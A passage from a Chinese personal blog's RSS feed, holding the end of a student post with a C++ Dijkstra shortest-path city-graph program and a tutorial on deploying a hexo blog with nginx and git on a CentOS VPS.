&lt;h2 id="数据结构的选用">数据结构的选用&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>存储图的数据结构书上讲解了三种，这里选择的是使用实现起来最简单的邻接矩阵。&lt;/p>
&lt;pre tabindex="0">&lt;code>#defin MAXSIZE 256
int map[MAXSIZE][MAXSIZE];
&lt;/code>&lt;/pre>&lt;p>当然你也可以选择使用邻接表，那就是挑战自己的事情。邻接表的好处是在图边数较为少的时候可以用更少的存储空间,但是邻接矩阵在访问速度，效率上高很多（所谓空间换时间233）&lt;/p>
&lt;/li>
&lt;li>
&lt;p>邻接矩阵的初始化。&lt;/p>
&lt;ul>
&lt;li>
&lt;p>因为假定城市之间是无向图，那么邻接矩阵应该是呈现出以对角线对称的趋势(因为map[x][y]的值等于map[y][x]因为我们这里认为这两个是一个路径，一个弧边)。我们把城市x到城市x自己的权值赋值为0，把城市x到城市y有路径的城市赋值为对应权值。城市间没有路径的话我们赋值权值为一个最大值0x7FFFFFFF,这又便于我们下面的Dijkstra算法进行&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当然为了打印邻接矩阵看着漂亮，在打印邻接矩阵的时候使用-代替了0x7FFFFFFF数据&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="sample.jpg" alt="">&lt;/p>
&lt;ul>
&lt;li>
&lt;p>还需要一个String数组来存储我们可能包含中文的城市名，数组的下标就对应邻接矩阵中的下标。&lt;/p>
&lt;pre tabindex="0">&lt;code>String Citylist[MAXSIZE];
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>因为采用了邻接矩阵存储图，那么删除城市节点的时候只需要删除对应的邻接矩阵中的行和列,以及存储城市名称数组中的对应位置，增加城市节点以及修改城市节点同理，都是通过遍历城市名称遍历得到城市编号，借由编号访问位于邻接矩阵中城市之间的权值：&lt;/p>
&lt;/li>
&lt;li>
&lt;p>以下是删除二维矩阵（邻接矩阵中行和列的操作，以及删除城市名称数组的操作）&lt;/p>
&lt;pre tabindex="0">&lt;code>void Delcol(int x) {
int i,j;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=1; i&amp;lt;=N; i++) {
for (j=x; j&amp;lt;N; j++)
map[i][j]=map[i][j+1];
map[i][j]=0;
}
}
void Delrow(int x) {
int i;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=x; i&amp;lt;N; i++)
memcpy(map[i],map[i+1],sizeof(int)*(N));
memset(map[i],0,N-1);
}
void Delname(int x) {
int i;
for (i=x; i&amp;lt;N; i++) CityList[i]=CityList[i+1];
CityList[i]= {0};
}
void Mapdel() {
int x;
cout&amp;lt;&amp;lt;&amp;#34;请输入您要删除的城市编号:&amp;#34;;
cin&amp;gt;&amp;gt;x;
Delname(x);
Delcol(x);
Delrow(x);
N--;
}
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>关于Dijkstra算法的详解&lt;/p>
&lt;ul>
&lt;li>首先还是从数据存储结构的设计入手。我们需要一个一维bool数组存储每个节点是否被访问过。并在寻路算法开始的时候初始化其内瓤&lt;/li>
&lt;li>其次，我们需要一个一维数组来存储从出发点到每个节点的路径长度&lt;/li>
&lt;li>最后，创建一个String数组来存储我们的路径&lt;/li>
&lt;li>关于Dijkstra算法理论的详解，我不是一个好老师，讲不清楚，就鸽了吧。当然数据结构的设计首先得理解算法思路。&lt;a href="https://blog.csdn.net/qq_35644234/article/details/60870719">Dijkstra算法详解(这个详解还是不错的，已经从很多提问里看出来这个博客的影子了)&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="源码实现">源码实现&lt;/h2>
&lt;h3 id="仅供学习">&lt;strong>仅供学习&lt;/strong>&lt;/h3>
&lt;p>代码里为了完成课设某个要求智障的初始化函数还请无视(☆-ｖ-)&lt;/p>
&lt;p>代码可能有很多智障的bug，毕竟也是写个课设交完报告就完事的，若有高见，还望指正。谢谢(●ˇ∀ˇ●)&lt;/p>
&lt;pre tabindex="0">&lt;code>#include&amp;lt;iostream&amp;gt;
#include&amp;lt;cstdio&amp;gt;
#include&amp;lt;cstring&amp;gt;
#include&amp;lt;conio.h&amp;gt;
#define MAXLEN 500
#define MAX 0x7FFFFFFF
using namespace std;
string CityList[MAXLEN];
int map[MAXLEN][MAXLEN]= {0};
int N;
bool check_input(int x,int y,int w,int N){
if (w&amp;lt;0 || x==y || x&amp;gt;N || y&amp;gt;N || (map[x][y]!=0 &amp;amp;&amp;amp; map[x][y]!=MAX)|| (map[x][y]!=0 &amp;amp;&amp;amp; map[x][y]!=MAX)){
cout&amp;lt;&amp;lt;&amp;#34;该组数据不符合规范，请重新输入&amp;#34;&amp;lt;&amp;lt;endl;
getch();
return true;
}
return false;
}
void Readin() {
int M,x,y,w;
memset(map,sizeof(map),0);
cout&amp;lt;&amp;lt;&amp;#34;请输入城市总数:&amp;#34;;
cin&amp;gt;&amp;gt;N;
cout&amp;lt;&amp;lt;&amp;#34;请输入路径数量:&amp;#34;;
cin&amp;gt;&amp;gt;M;
if (M&amp;gt;(N+1)*N/2){
cout&amp;lt;&amp;lt;&amp;#34;您输入的路径数量大于最大可能路径数量&amp;#34;&amp;lt;&amp;lt;endl;
getch();
return;
}
cout&amp;lt;&amp;lt;endl;
for (int i=1; i&amp;lt;=N; i++) {
printf(&amp;#34;第%d个城市名称:&amp;#34;,i);
cin&amp;gt;&amp;gt;CityList[i];
}
printf(&amp;#34;城市x编号 城市y编号 路径长度\n&amp;#34;);
printf(&amp;#34;-----------------------------\n&amp;#34;);
for (int i=1; i&amp;lt;=M; i++) {
do{
printf(&amp;#34;第%d组:&amp;#34;,i);
cin&amp;gt;&amp;gt;x&amp;gt;&amp;gt;y&amp;gt;&amp;gt;w;
}while(check_input(x,y,w,N));
map[x][y]=w;
map[y][x]=w;
}
for (int i=1; i&amp;lt;=N; i++) {
for (int j=1; j&amp;lt;=N; j++)
if (i!=j &amp;amp;&amp;amp; map[i][j]==0) map[i][j]=MAX;
}
}
void Mapprint(int n=N) {
if (N==0) return;
cout&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
for (int i=1; i&amp;lt;=n; i++) cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
cout&amp;lt;&amp;lt;endl;
for (int i=1; i&amp;lt;=n*9; i++) cout&amp;lt;&amp;lt;&amp;#39;-&amp;#39;;
cout&amp;lt;&amp;lt;endl;
for (int i=1; i&amp;lt;=n; i++) {
cout&amp;lt;&amp;lt;CityList[i]&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
for (int j=1; j&amp;lt;=n; j++)
if (map[i][j]!=MAX) cout&amp;lt;&amp;lt;map[i][j]&amp;lt;&amp;lt;&amp;#34;\t&amp;#34;;
else cout&amp;lt;&amp;lt;&amp;#34;-\t&amp;#34;;
cout&amp;lt;&amp;lt;endl;
}
}
void Mapadd() {
int n,x,y,w,m;
cout&amp;lt;&amp;lt;&amp;#34;请输入增加的城市个数:&amp;#34;;
cin&amp;gt;&amp;gt;n;
cout&amp;lt;&amp;lt;&amp;#34;请输入新增的路径个数:&amp;#34;;
cin&amp;gt;&amp;gt;m;
// if (m&amp;gt;(N*n+(n+1)*n/2)){
// cout&amp;lt;&amp;lt;&amp;#34;您输入的路径数量大于最大可能路径数量&amp;#34;&amp;lt;&amp;lt;endl;
// getch();
// return;
// }
cout&amp;lt;&amp;lt;endl;
for(int i=N+1; i&amp;lt;=N+n; i++) {
printf(&amp;#34;第%d个城市的名称:&amp;#34;,i);
cin&amp;gt;&amp;gt;CityList[i];
}
printf(&amp;#34;\n城市x编号 城市y编号 路径长度\n&amp;#34;);
printf(&amp;#34;-----------------------------\n&amp;#34;);
for (int i=1; i&amp;lt;=m; i++) {
do{
printf(&amp;#34;第%d组:&amp;#34;,i);
cin&amp;gt;&amp;gt;x&amp;gt;&amp;gt;y&amp;gt;&amp;gt;w;
}while (check_input(x,y,w,N+n));
map[x][y]=w;
map[y][x]=w;
}
for (int i=1;i&amp;lt;=N+n;i++)
for(int j=1;j&amp;lt;=N+n;j++)
if (i!=j &amp;amp;&amp;amp; map[i][j]==0) map[i][j]=MAX;
N=N+n;
}
void Delcol(int x) {
int i,j;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=1; i&amp;lt;=N; i++) {
for (j=x; j&amp;lt;N; j++)
map[i][j]=map[i][j+1];
map[i][j]=0;
}
}
void Delrow(int x) {
int i;
if (x&amp;gt;N or x&amp;lt;1) return;
for (i=x; i&amp;lt;N; i++)
memcpy(map[i],map[i+1],sizeof(int)*(N));
memset(map[i],0,N-1);
}
void Delname(int x) {
int i;
for (i=x; i&amp;lt;N; i++) CityList[i]=CityList[i+1];
CityList[i]= {0};
}
void Mapdel() {
int x;
cout&amp;lt;&amp;lt;&amp;#34;请输入您要删除的城市编号:&amp;#34;;
cin&amp;gt;&amp;gt;x;
Delname(x);
Delcol(x);
Delrow(x);
N--;
}
void Mapmod(){
string x,y;
int i,j,w;
cout&amp;lt;&amp;lt;&amp;#34;请输入您要修改的两个城市的名称&amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34;城市A:&amp;#34;; cin&amp;gt;&amp;gt;x;
cout&amp;lt;&amp;lt;&amp;#34;城市B:&amp;#34;; cin&amp;gt;&amp;gt;y;
cout&amp;lt;&amp;lt;&amp;#34;请输入修改值(输入值&amp;lt;=0删除路径):&amp;#34;; cin&amp;gt;&amp;gt;w;
for (i=1;i&amp;lt;=N;i++)
if (x==CityList[i]) break;
for (j=1;i&amp;lt;=N;j++)
if (y==CityList[j]) break;
if (i==N &amp;amp;&amp;amp; CityList[i]!=x){
cout&amp;lt;&amp;lt;&amp;#34;无法找到城市A&amp;#34;&amp;lt;&amp;lt;endl;
getch();
return;
}
if (j==N &amp;amp;&amp;amp; CityList[j]!=y){
cout&amp;lt;&amp;lt;&amp;#34;无法找到城市B&amp;#34;&amp;lt;&amp;lt;endl;
getch();
return;
}
if (w&amp;lt;=0) {
map[i][j]=MAX;
map[j][i]=MAX;
}
else{
map[i][j]=w;
map[j][i]=w;
}
}
bool check(bool* arr,int n){
for (int i=1;i&amp;lt;=n;i++)
if (!arr[i]) return true;
return false;
}
void Dijkstra(){
int d,s=1,pos,m;
cout&amp;lt;&amp;lt;&amp;#34;请输入目的地城市（默认出发城市即编号为1的城市）&amp;#34;&amp;lt;&amp;lt;endl;
cin&amp;gt;&amp;gt;d;
if (d&amp;gt;N){
cout&amp;lt;&amp;lt;&amp;#34;您输入的城市超出范围&amp;#34;&amp;lt;&amp;lt;endl;
getch();
return;
}
int dis[MAXLEN]={0};
bool is_v[MAXLEN];
string route[MAXLEN];
memset(is_v,0,sizeof(bool)*MAXLEN);
for (int i=1;i&amp;lt;=N;i++){
dis[i]=map[s][i];
route[i]=CityList[s]+&amp;#34;--&amp;gt;&amp;#34;+CityList[i];
}
dis[s]=0;
is_v[s]=true;
while (check(is_v,N)){
pos=0;
m=MAX;
for (int i=1;i&amp;lt;=N;i++)
if (!is_v[i] &amp;amp;&amp;amp; m&amp;gt;dis[i]){
m=dis[i];
pos=i;
}
is_v[pos]=true;
for (int i=1;i&amp;lt;=N;i++)
if (!is_v[i] &amp;amp;&amp;amp; dis[pos]+map[pos][i]&amp;gt;=0) {
if (dis[i]&amp;gt;dis[pos]+map[pos][i]){
dis[i]=dis[pos]+map[pos][i];
route[i]=route[pos]+&amp;#34;--&amp;gt;&amp;#34;+CityList[i];
}
}
}
if (dis[d]==0){
cout&amp;lt;&amp;lt;&amp;#34;不存在抵达该城市的路径&amp;#34;&amp;lt;&amp;lt;endl;
getch();
return;
}
cout&amp;lt;&amp;lt;&amp;#34;最短路径长度:&amp;#34;;
cout&amp;lt;&amp;lt;dis[d]&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;route[d]&amp;lt;&amp;lt;endl;
getch();
}
void logo(){
system(&amp;#34;cls&amp;#34;);
printf(&amp;#34; ____ _ _ __ __ \n&amp;#34;);
printf(&amp;#34; / __ \(_) (_) /_______/ /__________ _\n&amp;#34;);
printf(&amp;#34; / / / / / / / //_/ ___/ __/ ___/ __ `/\n&amp;#34;);
printf(&amp;#34; / /_/ / / / / ,&amp;lt; (__ ) /_/ / / /_/ / \n&amp;#34;);
printf(&amp;#34; /_____/_/_/ /_/|_/____/\\__/_/ \\__,_/ \n&amp;#34;);
printf(&amp;#34; /___/ \n&amp;#34;);
cout&amp;lt;&amp;lt;&amp;#34; --code by Yuuki | cc&amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34;=============================================&amp;#34;&amp;lt;&amp;lt;endl;
Mapprint();
cout&amp;lt;&amp;lt;&amp;#34;=============================================&amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34; 1.录入城市路径 &amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34; 2.增加城市路径 &amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34; 3.编辑城市路径 &amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34; 4.删除城市 &amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34; 5.计算最短路径 &amp;#34;&amp;lt;&amp;lt;endl;
cout&amp;lt;&amp;lt;&amp;#34; 0.退出 &amp;#34;&amp;lt;&amp;lt;endl;
}
void init(){
N=6;
CityList[1]=&amp;#34;南京&amp;#34;;
CityList[2]=&amp;#34;镇江&amp;#34;;
CityList[3]=&amp;#34;常州&amp;#34;;
CityList[4]=&amp;#34;苏州&amp;#34;;
CityList[5]=&amp;#34;无锡&amp;#34;;
CityList[6]=&amp;#34;上海&amp;#34;;
map[1][2]=1;
map[2][1]=1;
map[2][4]=3;
map[4][2]=3;
map[4][6]=15;
map[6][4]=15;
map[5][6]=4;
map[6][5]=4;
map[5][3]=5;
map[3][5]=5;
map[1][3]=12;
map[3][1]=12;
map[2][3]=9;
map[3][2]=9;
map[3][4]=4;
map[4][3]=4;
map[4][5]=13;
map[5][4]=13;
for (int i=1;i&amp;lt;=N;i++)
for (int j=1;j&amp;lt;=N;j++)
if (i!=j &amp;amp;&amp;amp; map[i][j]==0) map[i][j]=MAX;
}
int main() {
string choice;
N=0;
init();
while (true){
logo();
cin&amp;gt;&amp;gt;choice;
switch(choice[0]){
case &amp;#39;1&amp;#39;: Readin(); break;
case &amp;#39;2&amp;#39;: Mapadd(); break;
case &amp;#39;3&amp;#39;: Mapmod(); break;
case &amp;#39;4&amp;#39;: Mapdel(); break;
case &amp;#39;5&amp;#39;: Dijkstra(); break;
case &amp;#39;0&amp;#39;: return 0;
default:
continue;
}
}
return 0;
}
&lt;/code>&lt;/pre></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E7%AE%97%E6%B3%95/">算法</category><category domain="https://yuukisama.cc/tags/%E8%B1%A1%E7%89%99%E5%A1%94/">象牙塔</category></item><item><title>VPS+nginx+hexo搭建个人博客</title><link>https://yuukisama.cc/posts/code/vps-nginx-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</link><guid isPermaLink="true">https://yuukisama.cc/posts/code/vps-nginx-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</guid><pubDate>Thu, 27 Dec 2018 15:54:11 +0000</pubDate><author>chainyuuki@gmail.com (Yuuki)</author><copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright><description>&lt;h2 id="开始前的碎碎念">开始前的碎碎念&lt;/h2>
&lt;h3 id="为了搭建这个小站搜索了很多资料踩了很多坑这里努力写点有用的东西防止后人踩坑希望阅读的读者遇到问题时思考自己是否是符合本样例的情况">为了搭建这个小站，搜索了很多资料，踩了很多坑。这里努力写点有用的东西防止后人踩坑。希望阅读的读者遇到问题时思考自己是否是符合本样例的情况。&lt;/h3>
&lt;p>这是一篇旨在使用linux服务器+nginx+hexo+git实现搭建个人博客的教学性质文章。&lt;/p>
&lt;h2 id="requires">requires&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>一台服务器，本例子是linux centos,阿里的云服务器&lt;/p>
&lt;pre tabindex="0">&lt;code>[root@host~]# lsb_release -a
LSB Version: :core-4.1-amd64:core-4.1-noarch
Distributor ID: CentOS
Description: CentOS Linux release 7.6.1810 (Core)
Release: 7.6.1810
Codename: Core
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>本地电脑：window 10&lt;/p>
&lt;/li>
&lt;li>
&lt;p>nginx ; node.js ; hexo ; git ; npm&lt;/p>
&lt;/li>
&lt;/ul>
&lt;hr>
&lt;h2 id="本地电脑">本地电脑&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>安装git&lt;/p>
&lt;ul>
&lt;li>
&lt;p>windows &lt;a href="https://git-scm.com/downloads">下载&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>linux使用包管理器安装git &lt;del>(不了解包管理器的同学就不要看下去了吧)&lt;/del>&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install git -y
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>更多&lt;a href="https://git-scm.com/book/zh/v1">Git基本配置工作&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>安装node.js (node.js自带npm)&lt;/p>
&lt;p>&lt;a href="https://zh.wikipedia.org/wiki/Npm">什么是npm，本垃圾觉得大概类似python的pip吧&lt;del>什么你不知道pip是啥？？？这是wiki打不开就算了&lt;/del>&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>windows
&lt;a href="https://nodejs.org/zh-cn/download/">下载&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>linux
下载对应版本的node.js以及安装操作
&lt;a href="https://nodejs.org/zh-cn/download/">下载&lt;/a>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>安装hexo&lt;/p>
&lt;p>使用node.js的npm安装hexo，这里windows可以先设置一下npm的默认安装目录，本强迫症表示你默认装在c盘我很难受。打开命令行，运行:&lt;/p>
&lt;p>&lt;strong>坑：原教程里写了路径末尾加了node_modules，事实证明并不需要，这个命令会在目标目录生成一个node_modules。我这里设置默认安装路径在node.js本体的安装路径，因为这个路径里本身就有一个用于安装npm本身的nnode_modules文件夹。当然即使这样做了，npm运行缓存还是会存在c盘，需要继续修改设置的请移步&lt;a href="https://www.jianshu.com/p/645c758d4428">这里&lt;/a>&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>npm config set prefix &amp;#34;E:\node.js\&amp;#34;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>安装hexo
&lt;pre tabindex="0">&lt;code>npm install -g hexo-cli
&lt;/code>&lt;/pre>&lt;strong>坑：-g意为global，全局安装就会安装到你设置的安装目录里，没有这个参数默认会安装在你npm当时命令行运行的目录里创建node_moudels并进行安装&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>搭建博客&lt;/p>
&lt;p>&lt;strong>后续关于博客搭建的章节可以参照&lt;a href="https://hexo.io/zh-cn/docs/setup">官方教程&lt;/a>&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>创建一个文件夹用于做博客的目录&lt;/li>
&lt;li>切换到这个文件夹所在目录，运行命令：
&lt;pre tabindex="0">&lt;code>hexo init &amp;lt;folder name&amp;gt;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>进入该文件夹：
&lt;pre tabindex="0">&lt;code>npm install
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>坑：以上两步必不可缺，否则会产生缺少依赖问题，列入不生成静态文件（如x.html）的问题&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>配置你的站点：&lt;/p>
&lt;ul>
&lt;li>修改博客目录下的_congfig.yml文件&lt;a href="https://hexo.io/zh-cn/docs/configuration">官方教程&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>书写你的第一篇文章：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在你的博客文件夹内运行命令&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo new &amp;#34;Hallow world&amp;#34;
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>会在source文件夹内的默认_posts文件夹下生成一个md文件，接下来就可以参照markdown语法愉快的敲代码了&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>生成你的网站：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>在你的博客文件夹内运行命令&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo generate
&lt;/code>&lt;/pre>&lt;p>或者使用快捷缩写&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo g
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>在本地预览你的博客网站&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo server
&lt;/code>&lt;/pre>&lt;p>或者使用快捷缩写&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo s
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>坑：如果generate出错请检查博客文件夹下_config.yml内的配置是否正确，每一个冒号后面必须跟一个空格！！！&lt;/strong>&lt;/p>
&lt;p>&lt;strong>坑：如果没能本地预览可能是因为缺少hexo-server，请运行npm install hexo-server --save&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>安装hexo-deployer-git&lt;/p>
&lt;p>安装该模块方便使用hexo最牛逼的推送功能&lt;/p>
&lt;pre tabindex="0">&lt;code>npm install hexo-deployer-git --save
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>本地配置git生成私钥以及公钥&lt;/p>
&lt;p>在git安装配置没有出错的情况下，环境变量完成配置，用户信息设置完全的情况下：&lt;/p>
&lt;pre tabindex="0">&lt;code>ssh-keygen -t rsa -C &amp;#34;your_email@email.com&amp;#34;
&lt;/code>&lt;/pre>&lt;p>该命令会在c:\user(你的电脑用户名).ssh文件加下生成密钥对。id_rsa文件为私钥，id_rsa.pub为公钥。
&lt;strong>在后续的服务器配置过程中，我们会把公钥设置在服务器上，这样git推送的时候就可以免去密码认证&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="服务器配置linux">服务器配置（linux）&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>安装nginx&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install nginx -y
&lt;/code>&lt;/pre>&lt;p>你也可以使用lnmp一类的一键脚本安装web环境，这里不举例。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>配置nginx&lt;/p>
&lt;ul>
&lt;li>
&lt;p>基本配置&lt;/p>
&lt;p>找到nginx的配置文件，默认在/etc/nginx/nginx.conf编辑内容&lt;/p>
&lt;p>基本只需要简单的修改默认配置中的网站根目录以及域名的设置，找到如下字段&lt;/p>
&lt;pre tabindex="0">&lt;code>listen 80 default_server; # 默认端口
listen [::]:80 default_server;
server_name _; # 你的域名，没有的话根目录即可
root /home/www/blog; # 网站根目录,教程后续创建
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>启动nginx：&lt;/p>
&lt;pre tabindex="0">&lt;code>service nginx start
service nginx reload
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>设置开机自启：&lt;/p>
&lt;pre tabindex="0">&lt;code>chkconfig nginx on
&lt;/code>&lt;/pre>&lt;p>或者&lt;/p>
&lt;pre tabindex="0">&lt;code>systemctl enable nginx.servcice
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>开放防火墙放行80端口&lt;/p>
&lt;ul>
&lt;li>
&lt;p>运行&lt;/p>
&lt;pre tabindex="0">&lt;code>iptables -A INPUT -p tcp --dport 80 -j ACCEPT
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>保存防火墙设置&lt;/p>
&lt;pre tabindex="0">&lt;code>service iptables save
&lt;/code>&lt;/pre>&lt;p>&lt;strong>坑：本人这条命令并没有执行成功，这个版本的linux似乎不支持这条命令，最后还是执行的service iptables reload&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>查看防火墙规则:
出现这条内容意味着防火墙设置完成:&lt;/p>
&lt;pre tabindex="0">&lt;code>[root@host ~]# iptables --list -n
Chain INPUT (policy ACCEPT)
target prot opt source destination
ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>坑：云服务器供应商还会提供安全组一类的东西，请在那里面也放行对应端口&lt;/strong>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>测试nginx是否配置成功&lt;/p>
&lt;ul>
&lt;li>服务器本地访问又返回结果：
&lt;pre tabindex="0">&lt;code>curl 127.0.0.1
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>远程访问服务器网页端口，即在你的浏览器里输入服务器ip或者域名出现nginx默认页面即表示配置完成。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>配置git&lt;/p>
&lt;ul>
&lt;li>
&lt;p>如果服务器没有git请参照上面安装git&lt;/p>
&lt;/li>
&lt;li>
&lt;p>新建git用户,并设置用户密码&lt;/p>
&lt;pre tabindex="0">&lt;code>useradd git
passwd git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>新建网站目录,并修改网站根目录的用户拥有者为git用户&lt;/p>
&lt;pre tabindex="0">&lt;code>cd /home
mkdir www
cd www
mkdir blog
chown git:git blog
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>切换为git用户，进入其家目录创建.ssh文件夹，并进入&lt;/p>
&lt;pre tabindex="0">&lt;code>su git
cd ~
mkdir .ssh
cd .ssh
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>创建authorized_keys文件，讲你本地电脑上的公钥内的文件内容复制到该文件内。&lt;/p>
&lt;p>&lt;del>这里怎么操作自我发挥吧，把公钥文件传上来该跟名字，或者你开心就好&lt;/del>&lt;/p>
&lt;p>设置密钥文件只读，文件夹权限:&lt;/p>
&lt;pre tabindex="0">&lt;code>chmod 600 authorized_keys
chmod 700 /home/git/.ssh
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;hr>
&lt;ul>
&lt;li>配置ssh的配置文件/etc/ssh/sshd_config，修改如下词条&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>RSAAuthentication yes # 开启rsa密钥认证
PubkeyAuthentication yes # 开启公钥认证
AuthorizedKeysFile .ssh/authorized_keys # 设置存贮文件
&lt;/code>&lt;/pre>&lt;hr>
&lt;ul>
&lt;li>
&lt;p>在你的git用户家目录下新建你的博客仓库,并初始化为git裸仓库&lt;/p>
&lt;pre tabindex="0">&lt;code>mkdir blog.git
git init --bare blog.git
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>配置裸仓库:进入仓库文件夹，在hooks文件夹内新建post_receive。文件写下一下内容&lt;/p>
&lt;pre tabindex="0">&lt;code>#!/bin/bash
git --work-tree=/home/www/blog --git-dir=/home/git/blog.git checkout -f
&lt;/code>&lt;/pre>&lt;p>这是一个linux shell规定了当接受到post请求之后的动作，把文件内容放到网站根目录里&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>在你的本地！！！&lt;/strong> 测试ssh 免密码连接
&lt;code>ssh -T git@your_host&lt;/code>
如果没有提示输入密码证明配置成功&lt;/p>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="回到本地电脑">回到本地电脑&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>编辑blog下的配置文件_config.yml&lt;/p>
&lt;pre tabindex="0">&lt;code># Deployment
## Docs: https://hexo.io/docs/deployment.html
deploy:
type: git
repo: git@your_host:blog.git
branch: master
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>愉快的测试推送把！~ &lt;del>或者死于bug error hhh&lt;/del>&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo deploy
&lt;/code>&lt;/pre>&lt;p>或者&lt;/p>
&lt;pre tabindex="0">&lt;code>hexo d
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ol>
&lt;p>&lt;strong>坑：不安装hexo-deployer-git是不可能推送的&lt;/strong>&lt;/p>
&lt;p>&lt;strong>坑：如果访问页面出现cantnot GET/ 请检查主题设置，网上很多教程的设置基于hexo next主题，涉及到主题文件的请看你的主题的作者自己的文档，而不是看某dn&lt;/strong>&lt;/p></description><category domain="https://yuukisama.cc/categories/code/">CODE</category><category domain="https://yuukisama.cc/tags/%E5%BB%BA%E7%AB%99/">建站</category></item></channel></rss>